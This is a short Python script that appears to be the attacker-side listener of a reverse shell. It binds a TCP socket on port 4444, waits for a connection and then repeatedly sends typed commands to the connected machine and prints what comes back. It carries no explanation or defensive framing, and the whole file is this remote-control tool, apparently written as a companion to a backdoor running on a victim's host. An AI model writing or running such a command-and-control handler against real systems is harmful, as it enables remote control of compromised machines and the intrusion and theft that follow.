import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind(("IP", 4444))
listener.listen(0)

print("[+] Wailting Connection")

connection, address = listener.accept()

print("[+] Connection Successful from " + str(address))

while True:
    command = input(">> ")
    connection.send(command.encode())
    command_result = connection.recv(1024).decode("UTF-8")
    print(command_result)